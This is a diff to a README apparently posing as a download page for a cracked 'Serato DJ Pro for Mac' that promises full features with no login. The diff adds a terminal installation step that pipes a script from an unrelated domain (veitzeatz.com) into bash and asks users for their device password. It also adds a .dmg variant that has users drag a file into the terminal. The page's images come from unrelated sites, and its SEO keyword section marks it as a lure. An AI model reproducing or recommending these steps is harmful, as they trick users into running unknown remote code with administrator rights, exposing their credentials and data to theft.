@@ -1,14 +1,28 @@
-# Serato DJ Pro — Download for macOS (Offline Setup Guide)
+# Serato DJ Pro for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](serato-dj-pro-download-mac.github.io)
 
-⚙️ **How to Use**
+## 📦 How to Install
 
-1. Click the download button above  
-2. Extract the `.zip` archive using Keka or The Unarchiver  
-3. Run the included setup assistant  
-4. Follow the on-screen instructions  
-5. Launch Serato DJ Pro — full features, no login required  
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
 
 🎯 **What You Unlock**
 
@@ -22,13 +36,13 @@
 🖼 **Preview**
 
 ![Serato DJ Pro Interface](https://ableton-production.imgix.net/components/text-beside-media/web-browser-lavender-light.png?auto=compress%2Cformat&w=768)  
-*Serato DJ Pro clean and intuitive interface*
+
 
 ![Serato DJ Pro Campaign](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/file-uploads/blogs/2147484495/images/3d45be4-3353-2314-c0db-e5dc638823_Which_Ableton_Live_version_is_the_best.png)  
-*Official Serato DJ Pro campaign banner*
+
 
 ![Serato DJ Pro DJ Drops](https://media.sweetwater.com/m/products/image/b05b2dafaaC0JoWzCxe3HPXbhJZDjuwG7mNKTkCk.jpg?quality=82&ha=b05b2dafaa25d8da)  
-*How to add DJ Drops in Serato DJ Pro*
+
 
 🔍 **SEO Keywords**
 
